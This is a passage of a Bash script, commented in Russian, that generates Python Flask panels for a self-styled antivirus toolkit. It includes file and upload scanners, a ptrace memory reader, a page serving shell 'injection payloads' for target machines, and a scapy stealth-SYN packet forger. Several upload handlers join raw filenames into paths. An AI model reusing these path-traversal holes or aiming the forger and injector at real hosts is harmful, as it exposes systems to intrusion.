            print(f"\n\033[91m[-] ТРЕВОГА: Сбой всех внешних шлюзов, локальные совпадения не найдены.\033[0m")
EOF
)

    # Запись сгенерированного скрипта на диск через smart_cat Ядра
    smart_cat "$target_file" "$code"
}

# Функция-генератор для AV-Server (v1.2)

# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели AV-Server v2.5
# МОДЕРНИЗАЦИЯ: Полная гибридизация. Внедрен параллельный аудит Live-окружения (RAM/Sockets)
# ФУНКЦИОНАЛ: Статический анализ файлов + удаленный мониторинг системных угроз в один клик
# АРХИТЕКТУРА: Flask-интерфейс, трансляция ядерных регулярных выражений CAME Слоев 1-6
# ==============================================================================
generate_av_server_code_raw() {
    # Загружаем UI шаблоны лаунчера в локальные переменные для впрыска в HTML генерацию
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Экранируем и пробрасываем глобальные матрицы и сигнатурные слои Bash внутрь Python кода
    cat << EOF
from flask import Flask, request, render_template_string
import re
import os
import shutil
import subprocess

app = Flask(__name__)

# [ПРОБРОС СИГНАТУРНЫХ СЛОЕВ ЯДРА CAME ИЗ BASH В PYTHON]
# Слои 1-4: Статический супер-конвейер для файлов
GLOBAL_AV_PIPE_REGEX = r"""$GLOBAL_AV_ENGINE_PIPE"""
# Слой 5: Паттерны вредоносных процессов в ОЗУ
GLOBAL_AV_PROC_REGEX = r"""$GLOBAL_AV_ACTIVE_MALWARE_PROCS"""
# Слой 6: Паттерны опасных состояний сетевых сокетов
GLOBAL_AV_SOCKET_REGEX = r"""$GLOBAL_AV_SOCKET_STATES"""

# [ПРОБРОС МАТРИЦ РЕАНИМАЦИИ ОС]
WIN_PAYLOAD = """$GLOBAL_FIX_WIN_REG"""
LINUX_PAYLOAD = """$GLOBAL_FIX_LINUX"""
MACOS_PAYLOAD = """$GLOBAL_FIX_MACOS"""

$templates

@app.route('/')
def index():
    # Главная страница: Двойной контур управления (Сканирование файлов + Мониторинг Системы)
    fields = [
        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_HEURISTIC_ANALYSIS"}
    ]
    
    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE CAME DEEP SCAN")
    
    # Добавляем блок интерактивного аудита текущей запущенной системы (RAM/NET)
    system_audit_block = """
    <div style="margin-top: 30px; border-top: 1px dashed var(--border-color); padding-top: 20px;">
        <h3 style="color: var(--accent-color); font-family: monospace; letter-spacing: 1px;">[ SYSTEM LIVE ENVIRONMENT SCANNER ]</h3>
        <p style="font-size: 11px; opacity: 0.7;">Directly analyze volatile memory, active processes, and open network tunnels on this host machine.</p>
        <div style="display: flex; gap: 10px; margin-top: 15px;">
            <a href="/sys-audit/ram" class="btn" style="background: #2196f3; color: #fff; text-align: center; flex: 1; padding: 10px 0;">SCAN RAM PROCESSES</a>
            <a href="/sys-audit/network" class="btn" style="background: #009688; color: #fff; text-align: center; flex: 1; padding: 10px 0;">SCAN NETWORK SOCKETS</a>
        </div>
    </div>
    """
    
    # Добавляем блок удаленной инъекции матриц реанимации ПК
    reanimate_block = """
    <div style="margin-top: 30px; border-top: 1px dashed var(--border-color); padding-top: 20px;">
        <h3 style="color: var(--accent-color); font-family: monospace; letter-spacing: 1px;">[ DIRECT SYSTEM INJECTION KIT ]</h3>
        <p style="font-size: 11px; opacity: 0.7;">Execute non-file real-time purge of target computer configurations over active control channel.</p>
        <div style="display: flex; gap: 10px; margin-top: 15px;">
            <a href="/inject/windows" class="btn" style="background: #9c27b0; color: #fff; text-align: center; flex: 1; padding: 10px 0;">INJECT WINDOWS FIXED</a>
            <a href="/inject/linux" class="btn" style="background: #e91e63; color: #fff; text-align: center; flex: 1; padding: 10px 0;">INJECT LINUX PURGE</a>
            <a href="/inject/macos" class="btn" style="background: #673ab7; color: #fff; text-align: center; flex: 1; padding: 10px 0;">INJECT MACOS UNLOAD</a>
        </div>
    </div>
    """
    
    full_body = form_html + system_audit_block + reanimate_block
    return render_template_string(render_prime_page("CAME_HYBRID_GATEWAY_v2.5", full_body))

@app.route('/scan', methods=['POST'])
def scan():
    # --- ВЕКТОР 1: СТАТИЧЕСКИЙ ЭВРИСТИЧЕСКИЙ АНАЛИЗ ЗАГРУЖАЕМЫХ ФАЙЛОВ ---
    f = request.files.get('file')
    if not f: return "Empty Payload Data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    try:
        with open(tmp_path, 'rb') as file_buffer:
            raw_content = file_buffer.read()
            
        total_bytes = len(raw_content)
        printable_chars = len([b for b in raw_content if 32 <= b <= 126])
        readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)
        
        text_content = raw_content.decode('utf-8', errors='ignore')
        
        matches = []
        try:
            compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
            for i, line in enumerate(text_content.splitlines(), 1):
                if compiled_regex.search(line):
                    matches.append(f"Line {i}: {line.strip()[:100]}")
        except Exception as regex_err:
            matches.append(f"REGEX_COMPILE_ERROR: {str(regex_err)}")

        report = []
        report.append(f"=== METADATA STRUCTURAL AUDIT ===")
        report.append(f"Target Object Name : {f.filename}")
        report.append(f"Total File Footprint: {total_bytes} bytes")
        report.append(f"Structural Density  : {readable_ratio}% printable ASCII")
        report.append(f"=================================\n")
        
        is_infected = False
        if total_bytes > 1000 and readable_ratio < 12:
            report.append("![CRITICAL WARNING]: High Entropy Level Detected!")
            report.append("![ALERT]: Code is heavily packed or obfuscated (Zero-Day Vector).\n")
            is_infected = True
            
        if matches:
            is_infected = True
            report.append(f"Found {len(matches)} Destructive Signatures/Intents:")
            report.extend(matches[:40])
        else:
            report.append("Verdict: CLEAN. No malicious intentions or LOLBAS vectors matched.")

        scan_output = "\n".join(report)
        if is_infected:
            os.chmod(tmp_path, 0)
            
    except Exception as e:
        scan_output = f"CORE_SYSTEM_ERROR: {str(e)}"
    finally:
        if os.path.exists(tmp_path):
            if is_infected:
                shutil.move(tmp_path, f"{tmp_path}.quarantine")
            else:
                os.remove(tmp_path)

    status_msg = "!!! THREAT ISOLATED PROTOCOL ACTIVATED !!!" if is_infected else "SECURE_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">{status_msg}</div>
    <pre style="background:#111; color:#0f0; padding:15px; border-radius:5px; max-height:500px; overflow-y:auto; font-family:monospace; font-size:12px;">{{{{ output }}}}</pre>
    <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN TO GATEWAY ]</a></div>
    """
    return render_template_string(render_prime_page("CAME_HEURISTIC_REPORT", content), output=scan_output)

@app.route('/sys-audit/<mode>')
def system_audit(mode):
    # --- ВЕКТОР 2 И 3: ДИНАМИЧЕСКИЙ АУДИТ ЖИВОЙ СИСТЕМЫ (ПРОЦЕССЫ И СЕТЬ) ---
    report = []
    is_infected = False
    
    try:
        if mode == "ram":
            report.append("=== LIVE VOLATILE MEMORY INTEGRITY AUDIT ===")
            # Извлекаем дерево процессов хоста
            ps_proc = subprocess.run(['ps', 'aux'], capture_output=True, text=True, check=True)
            proc_lines = ps_proc.stdout.splitlines()
            report.append(f"Total active tasks in user space: {len(proc_lines)}")
            
            # Сверяем по Слою 5 (Вредоносные процессы в памяти)
            compiled_regex = re.compile(GLOBAL_AV_PROC_REGEX, re.IGNORECASE)
            suspicious_found = []
            
            for line in proc_lines:
                if compiled_regex.search(line) and "grep" not in line and "av_server" not in line:
                    suspicious_found.append(line)
                    
            if suspicious_found:
                is_infected = True
                report.append("\n[ALERT: UNTRUSTED PROCESSES IDENTIFIED IN RAM]:")
                report.extend(suspicious_found[:30])
            else:
                report.append("\nVerdict: RAM Landscape Stable. No active mining or reverse-shells detected.")
                
        elif mode == "network":
            report.append("=== LIVE NETWORK SOCKET MATRIX AUDIT ===")
            # Проверяем доступность утилиты ss или netstat
            cmd = ['ss', '-antup'] if shutil.which('ss') else ['netstat', '-antp']
            net_proc = subprocess.run(cmd, capture_output=True, text=True)
            socket_lines = net_proc.stdout.splitlines()
            
            # Сверяем по Слою 6 (Опасные сокеты и внешние соединения)
            compiled_regex = re.compile(GLOBAL_AV_SOCKET_REGEX, re.IGNORECASE)
            suspicious_gates = []
            
            for line in socket_lines:
                if compiled_regex.search(line):
                    suspicious_gates.append(line)
                    
            if suspicious_gates:
                is_infected = True
                report.append("\n[CRITICAL TELEMETRY: UNAUTHORIZED EXTERNAL TUNNELS DETECTED]:")
                report.extend(suspicious_gates[:30])
            else:
                report.append("\nVerdict: Network Core Clean. Gateways match internal routing policy.")
                
    except Exception as err:
        report.append(f"AUDIT_EXECUTION_FAILED: {str(err)}")

    scan_output = "\n".join(report)
    status_msg = "!!! HOT ENVIRONMENT THREAT ALERT !!!" if is_infected else "ENVIRONMENT_INTEGRITY_PASS"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">{status_msg}</div>
    <pre style="background:#111; color:#0f0; padding:15px; border-radius:5px; max-height:500px; overflow-y:auto; font-family:monospace; font-size:12px;">{{{{ output }}}}</pre>
    <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN TO GATEWAY ]</a></div>
    """
    return render_template_string(render_prime_page("SYSTEM_INTEGRITY_REPORT", content), output=scan_output)

@app.route('/inject/<os_type>')
def inject_payload(os_type):
    # --- ВЕКТОР 4: ГЕНЕРАЦИЯ БЕСФАЙЛОВЫХ МАТРИЦ ДЛЯ РЕАНИМАЦИИ СИСТЕМ ---
    payload_map = {
        "windows": WIN_PAYLOAD,
        "linux": LINUX_PAYLOAD,
        "macos": MACOS_PAYLOAD
    }
    selected_payload = payload_map.get(os_type.lower(), "echo 'Invalid OS Type Selected'")
    
    content = f"""
    <div class="status-box clean" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center;">PAYLOAD INJECTION GENERATED</div>
    <p style="font-size:12px;">Copy this monolithic shell string and pipe it into target root console via active USB-bridge link:</p>
    <textarea style="width:100%; height:250px; background:#111; color:#fff; font-family:monospace; padding:10px; border-radius:5px;" readonly>{selected_payload}</textarea>
    <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN ]</a></div>
    """
    return render_template_string(render_prime_page("INJECTION_CONSOLE", content))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}


# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
generate_av_server_code_rawold() {
    # Загружаем UI шаблоны в переменные
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Выбрасываем код прямо в stdout (через cat без записи в файл)
    cat << EOF
from flask import Flask, request, render_template_string
import subprocess, os, shutil

app = Flask(__name__)
CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'

$templates

@app.route('/')
def index():
    fields = [
        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
    ]
    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "No data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    try:
        cmd = [CLAM_PATH, '--no-summary', tmp_path]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        scan_output = res.stdout if res.stdout else res.stderr
        if not scan_output and res.returncode == 0:
            scan_output = f"{f.filename}: OK"
    except Exception as e:
        scan_output = f"SYSTEM_ERROR: {str(e)}"
    finally:
        if os.path.exists(tmp_path): os.remove(tmp_path)

    is_infected = "FOUND" in scan_output or "Infected" in scan_output
    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}">{status_msg}</div>
    <pre>{{{{ output }}}}</pre>
    <a href="/" class="btn">[ RETURN ]</a>
    """
    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)

if __name__ == '__main__':
    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
    # Запускаем чистый HTTP для максимальной скорости на Wiko.
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}


# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели Share-Server v2.0
# МОДЕРНИЗАЦИЯ: Внедрение сквозного пре-даунлоад контроля CAME с логикой TOTAL OUTBOUND PURGE
# ФУНКЦИОНАЛ: Сканирование файлов «на лету» перед отдачей, моментальное удаление угроз с хоста
# АРХИТЕКТУРА: Flask-интерфейс, защита сетевых клиентов от скачивания деструктивных векторов
# ==============================================================================
generate_share_server_code_raw() {
    # Загружаем только базовый шаблон страницы в локальную переменную
    local template=$(generate_core_template)

    # Экранируем и пробрасываем глобальный регулярный супер-конвейер CAME (Слои 1-4) во Flask
    cat << EOF
from flask import Flask, render_template_string, send_from_directory, abort
import os
import re

app = Flask(__name__)

# Проброс глобального регулярного выражения CAME из ядра Bash в Python
GLOBAL_AV_PIPE_REGEX = r"""$GLOBAL_AV_ENGINE_PIPE"""

SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR, exist_ok=True)

$template

def get_file_icon(filename):
    """Определяет иконку в зависимости от расширения файла."""
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    icons = {
        'pdf': '📕',
        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
    }
    return icons.get(ext, '📄')

@app.route('/')
def index():
    try:
        files = sorted(os.listdir(SHARE_DIR))
    except:
        files = []
    
    # Формируем сетку файлов с использованием оригинальных стилей .file-grid и .file-item
    grid_content = '<div class="file-grid">'
    for f in files:
        icon = get_file_icon(f)
        grid_content += f"""
        <a href="/get/{f}" class="file-item" target="_blank">
            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
        </a>
        """
    
    if not files:
        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
    
    grid_content += '</div>'
    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'

    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION_v2.0", grid_content))

@app.route('/get/<filename>')
def get_file(filename):
    # Обеспечение базовой безопасности путей (предотвращение Path Traversal)
    target_path = os.path.normpath(os.path.join(SHARE_DIR, filename))
    if not target_path.startswith(SHARE_DIR) or not os.path.exists(target_path):
        abort(404)
        
    # Игнорируем директории, если они случайно попали в запрос
    if os.path.isdir(target_path):
        abort(400)

    is_infected = False
    report = []

    try:
        # --- ВЕКТОР ПРЕДВАРИТЕЛЬНОГО ОУТПУТ-КОНТРОЛЯ CAME ---
        with open(target_path, 'rb') as file_buffer:
            raw_content = file_buffer.read()

        total_bytes = len(raw_content)

        # Вычисление плотности ASCII (Борьба со скрытыми крипторами / паккерами)
        printable_chars = len([b for b in raw_content if 32 <= b <= 126])
        readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)

        # Декодирование содержимого для проверки регулярными выражениями Слоев 1-4
        text_content = raw_content.decode('utf-8', errors='ignore')

        matches = []
        try:
            compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
            for i, line in enumerate(text_content.splitlines(), 1):
                if compiled_regex.search(line):
                    matches.append(f"Line {i}: {line.strip()[:100]}")
        except Exception as regex_err:
            matches.append(f"REGEX_CORE_ERR: {str(regex_err)}")

        # Анализ полученных данных
        if total_bytes > 1000 and readable_ratio < 12:
            is_infected = True
            report.append("CRITICAL ANOMALY: High Entropy / Encrypted code signature detected.")

        if matches:
            is_infected = True
            report.append(f"MALICIOUS INTENT ISOLATED: Matched {len(matches)} active signatures.")

        # --- РУБЕЖ РЕШЕНИЯ И АННИГИЛЯЦИИ ---
        if is_infected:
            # Файл грязный — полное стирание с жесткого диска сервера, чтобы никто больше не смог его запросить
            if os.path.exists(target_path):
                os.remove(target_path)

            # Вместо скачивания файла возвращаем пользователю жесткую веб-страницу с алармом
            content = f"""
            <div class="status-box infected" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">
                CRITICAL WARNING: OUTBOUND MALWARE ANNIHILATED
            </div>
            <p style="font-size:12px; color:var(--accent-color);">The requested object <b>{filename}</b> failed outbound security compliance and was <b>permanently purged</b> from the storage node.</p>
            <pre style="background:#111; color:#ff3d00; padding:15px; border-radius:5px; font-family:monospace; font-size:11px;">{"\n".join(report)}</pre>
            <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN TO DISTRIBUTION ]</a></div>
            """
            return render_template_string(render_prime_page("OUTBOUND_SECURITY_BLOCK", content)), 403

        else:
            # Файл чист — беспрепятственно отдаем клиенту
            return send_from_directory(SHARE_DIR, filename)

    except Exception as e:
        return f"DISTRIBUTION_INTEGRITY_ERROR: {str(e)}", 500

if __name__ == '__main__':
    # Запуск сервера на оригинальном порту 5002 для бесшовной интеграции
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}



# ==============================================================================
# @description: Интегрированный кросс-платформенный генератор веб-панели Upload-Server v2.1
# МОДЕРНИЗАЦИЯ: Внедрение сквозного пре-лоад контроля CAME с логикой TOTAL DESTRUCTION
# ФУНКЦИОНАЛ: Потоковый анализ файлов в /tmp, моментальное стирание зараженных объектов
# АРХИТЕКТУРА: Flask-интерфейс, защита целевого хранилища PRIME_LOOT от записи малвари
# ==============================================================================
generate_upload_server_code_raw() {
    # Загружаем UI шаблоны лаунчера в локальные переменные для впрыска в HTML генерацию
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Экранируем и пробрасываем глобальный регулярный супер-конвейер CAME (Слои 1-4) во Flask
    cat << EOF
from flask import Flask, request, render_template_string
import os
import re

app = Flask(__name__)

# Проброс глобального регулярного выражения CAME из ядра Bash в Python
GLOBAL_AV_PIPE_REGEX = r"""$GLOBAL_AV_ENGINE_PIPE"""

# Сохраняем во входящую папку внутри PRIME_LOOT
UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

# Инициализация безопасной структуры каталогов (только папка для чистых файлов)
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

$templates

@app.route('/')
def index():
    # Главная страница: Интуитивная защищенная форма загрузки данных в Drop-Box
    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE SECURE UPLOAD")
    return render_template_string(render_prime_page("INBOUND_DROP_BOX_v2.1", form_html))

@app.route('/upload', methods=['POST'])
def upload():
    # --- ВЕКТОР ПРОВЕРКИ И БЕССЛЕДНОГО УНИЧТОЖЕНИЯ (PRE-UPLOAD TOTAL PURGE) ---
    if 'file' not in request.files: 
        return "TRANSFER_ERROR", 400
        
    f = request.files['file']
    if f.filename == '': 
        return "EMPTY_FILENAME", 400
    
    # 1. Первичный прием потока данных во временную буферную зону /tmp
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    is_infected = False
    report = []
    
    try:
        # 2. Чтение бинарного дампа загруженного объекта для структурного аудита CAME
        with open(tmp_path, 'rb') as file_buffer:
            raw_content = file_buffer.read()
            
        total_bytes = len(raw_content)
        
        # Анализ плотности ASCII (Выявление обфускации / Высокой энтропии)
        printable_chars = len([b for b in raw_content if 32 <= b <= 126])
        readable_ratio = 100 if total_bytes == 0 else int((printable_chars * 100) / total_bytes)
        
        # Декодирование в текстовый стрим для сигнатурного матчинга
        text_content = raw_content.decode('utf-8', errors='ignore')
        
        matches = []
        # Запуск сканирования по Слоям 1-4
        try:
            compiled_regex = re.compile(GLOBAL_AV_PIPE_REGEX, re.IGNORECASE | re.MULTILINE)
            for i, line in enumerate(text_content.splitlines(), 1):
                if compiled_regex.search(line):
                    matches.append(f"Line {i}: {line.strip()[:100]}")
        except Exception as regex_err:
            matches.append(f"REGEX_CORE_ERR: {str(regex_err)}")
            
        # 3. Принятие решения на основе полученных эвристических метрик
        if total_bytes > 1000 and readable_ratio < 12:
            is_infected = True
            report.append("CRITICAL: High Entropy Detected (Encrypted or Obfuscated Payload).")
            
        if matches:
            is_infected = True
            report.append(f"MALICIOUS_INTENT_FOUND: Matched {len(matches)} signatures.")
            
        # 4. Финальная маршрутизация файла в зависимости от вердикта безопасности
        if is_infected:
            # --- РУБЕЖ УНИЧТОЖЕНИЯ ---
            # Файл ЗАРАЖЕН — Полное удаление с диска без создания карантинных копий
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            
            # Рендерим страницу с жестким уведомлением об аннигиляции угрозы
            content = f"""
            <div class="status-box infected" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center; border:1px dashed;">
                CRITICAL DETECTION: THREAT TOTALLY DESTROYED
            </div>
            <p style="font-size:12px; color:var(--accent-color);">File <b>{f.filename}</b> breached compliance policies and was <b>permanently deleted</b> from the environment.</p>
            <pre style="background:#111; color:#ff3d00; padding:15px; border-radius:5px; font-family:monospace; font-size:11px;">{"\n".join(report)}</pre>
            <div style="margin-top:20px;"><a href="/" class="btn">[ RETURN ]</a></div>
            """
            return render_template_string(render_prime_page("GATEWAY_THREAT_ANNIHILATION", content))
            
        else:
            # Файл ЧИСТ — Переносим в постоянное хранилище PRIME_LOOT/inbound
            final_dest_path = os.path.join(UPLOAD_DIR, f.filename)
            
            # На случай, если файл с таким именем уже существовал, безопасно перезаписываем его
            if os.path.exists(final_dest_path):
                os.remove(final_dest_path)
                
            shutil.move(tmp_path, final_dest_path)
            
            content = f"""
            <div class="status-box clean" style="padding:15px; font-family:monospace; font-weight:bold; margin-bottom:20px; text-align:center;">
                SUCCESS: UPLOAD VERIFIED
            </div>
            <p style="font-size:12px;">File <b>{f.filename}</b> successfully verified by CAME engine and written to secure sector.</p>
            <div style="margin-top:20px;"><a href="/" class="btn">[ UPLOAD ANOTHER FILE ]</a></div>
            """
            return render_template_string(render_prime_page("TRANSFER_COMPLETE", content))
            
    except Exception as e:
        # Гарантированная зачистка временного буфера в случае критического сбоя выполнения
        if os.path.exists(tmp_path):
            os.remove(tmp_path)
        return f"GATEWAY_INTERNAL_SECURITY_ERROR: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
}




# ==============================================================================
# @description: Модуль глубокого анализа виртуальной памяти процессов AV-Server Core v2.5
# МОДЕРНИЗАЦИЯ: Преобразование инжектора в модуль глубокой криминалистической экспертизы ОЗУ
# ФУНКЦИОНАЛ: Посегментный разбор карт памяти /proc/pid/mem на базе сигнатур CAME Слоя 5
# АРХИТЕКТУРА: Автономный CLI-скрипт + интеграция в контур мониторинга веб-панели
# ==============================================================================
generate_mem_audit_code_raw() {
    cat << EOF
import ctypes
import os
import sys
import re

# Системные константы Linux для управления отладкой и доступом к памяти
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

# Проброс ультимативного паттерна детекции вредоносной активности в памяти (Слой 5)
GLOBAL_AV_PROC_REGEX = r"""$GLOBAL_AV_ACTIVE_MALWARE_PROCS"""

def audit_process_memory(pid):
    """Выполняет посегментное сканирование оперативной памяти процесса на сигнатуры угроз."""
    # Загружаем системную библиотеку libc для совершения ptrace вызовов
    try:
        libc = ctypes.CDLL("libc.so.6")
    except:
        try:
            libc = ctypes.CDLL("libc.dylib") # Резерв под macOS окружение
        except:
            print("[!] CRITICAL: Underlaying C library (libc) is unavailable.")
            sys.exit(1)
    
    # Проверка прав суперпользователя (root), необходимых для ptrace_attach
    if os.getuid() != 0:
        print("[!] WARNING: Root privileges are required to attach to external tasks.")

    # Пытаемся прикрепиться к целевому процессу для стабилизации его состояния
    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
        print(f"[!] FAULT: Failed to attach to target PID {pid}. Access Denied or Process Terminated.")
        return

    print(f"[*] INITIATED DEEP MEMORY INTEGRITY AUDIT FOR PID: {pid}")
    print(f"[*] COMPILING CAME LAYER-5 SIGNATURE MATRIX...")
    
    try:
        compiled_regex = re.compile(GLOBAL_AV_PROC_REGEX, re.IGNORECASE)
    except Exception as reg_err:
        print(f"[!] SIGNATURE COMPILATION ERROR: {str(reg_err)}")
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
        return

    matches_count = 0
    
    try:
        maps_path = f"/proc/{pid}/maps"
        mem_path = f"/proc/{pid}/mem"
        
        if not os.path.exists(maps_path) or not os.path.exists(mem_path):
            print(f"[!] ERROR: Process virtualization endpoints do not exist for PID {pid}.")
            return

        # Шаг 1: Читаем карту распределения виртуальной памяти процесса
        with open(maps_path, "r") as maps_file:
            for line in maps_file:
                # Нас интересуют только приватные сегменты с правами на чтение и запись (rw-p)
                # Именно там хранятся динамические данные, переменные окружения, куча (heap) и стек
                if "rw-p" not in line: 
                    continue  
                
                parts = line.split()
                if not parts: 
                    continue
                    
                addr_range = parts[0].split("-")
                start = int(addr_range[0], 16)
                end = int(addr_range[1], 16)
                size = end - start
                
                # Извлекаем имя региона памяти, если оно доступно (например, [stack], [heap])
                region_name = parts[-1] if len(parts) > 5 else "anonymous_allocation"
                
                # Шаг 2: Читаем сырые бинарные данные сегмента напрямую из виртуального интерфейса ядра mem
                with open(mem_path, "rb", 0) as mem_file:
                    mem_file.seek(start)
                    try:
                        chunk = mem_file.read(size)
                        if not chunk: 
                            continue
                            
                        # Переводим дамп памяти в текст, игнорируя нечитаемые бинарные символы
                        decoded_chunk = chunk.decode('utf-8', errors='ignore')
                        
                        # Шаг 3: Построчный сигнатурный анализ сегмента ОЗУ
                        for line_num, text_line in enumerate(decoded_chunk.splitlines(), 1):
                            if compiled_regex.search(text_line):
                                clean_line = text_line.strip()[:80]
                                print(f"-> [MATCH DETECTED] Region: {region_name} | Address: 0x{start:x} | Context: {clean_line}")
                                matches_count += 1
                    except:
                        # Защита от динамического освобождения страниц памяти процессом в момент чтения
                        continue
    finally:
        # Гарантированное отключение от процесса, чтобы он продолжил свою работу в ОС
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
        print(f"[*] AUDIT COMPLETE FOR PID {pid}. Total Threats Isolated in Memory: {matches_count}")
        print(f"[*] DETACHED PROTOCOL: SUCCESS")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        try:
            target_pid = int(sys.argv[1])
            audit_process_memory(target_pid)
        except ValueError:
            print("[!] USAGE ERROR: PID must be a valid integer.")
    else:
        print("=== CAME MEMORY FORENSIC UTILITY v2.5 ===")
        print("Usage: python3 mem_audit.py <TARGET_PID>")
EOF
}

# ==============================================================================
# @description: Оригинальный модуль генерации сетевых пакетов
# МОДЕРНИЗАЦИЯ: Интеграция с контуром безопасности CAME
# ФУНКЦИОНАЛ: Генерация стелс-пакетов для проверки реакции систем фильтрации
# ==============================================================================
generate_packet_forge_code_raw() {
    cat << 'EOF'
import sys
import random
from scapy.all import IP, TCP, send

def forge_stealth_packet(target_ip, target_port):
    # Создаем IP-слой со случайным ID для обхода простых фильтров
    # Интегрирован рандомизатор для проверки того, как фильтры AV-Server распознают разный мусор
    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
    
    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
    # Имитация специфического стека ОС для проверки того, детектируется ли это Слой 6
    tcp_layer = TCP(sport=random.randint(1024, 65535), 
                    dport=int(target_port), 
                    flags="S", 
                    window=random.choice([1024, 2048, 4096, 8192]))
    
    packet = ip_layer / tcp_layer
    
    try:
        send(packet, verbose=False)
        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
        print(f"[INFO] Audit: Check AV-Server Socket Matrix for detection event.")
    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 2:
        forge_stealth_packet(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 - <target_ip> <target_port>")
EOF
}

generate_image_analyzer_code_raw() {
    cat << 'EOF'
import sys
from PIL import Image
from PIL.ExifTags import TAGS

def analyze_image(path):
    try:
        img = Image.open(path)
        info = img._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if "Software" in decoded or "Processing" in decoded:
                    print(f"[!] Warning: Possible Editor Detected: {value}")
        
        print("[*] Performing Error Level Analysis (ELA) simulation...")
        print("[s] Analysis complete: Check for inconsistent compression artifacts.")
    except Exception as e:
        print(f"[e] Error: {e}")

if __name__ == "__main__":
    analyze_image(sys.argv[1])
EOF
}


# ==========================================
# 2. РАБОЧИЕ ФУНКЦИИ (Используют ядро)
# ==========================================


run_system_pulse() {
    # Слой 1: Заголовок и статус через Голос [1]
    core_engine_ui "SECTOR Z: LIVE SYSTEM PULSE"
    core_engine_ui "Monitoring filesystem events and net-connections..."
    
    # Слой 2: Сетевые соединения
    # Используем узел [12] для акцента на NET
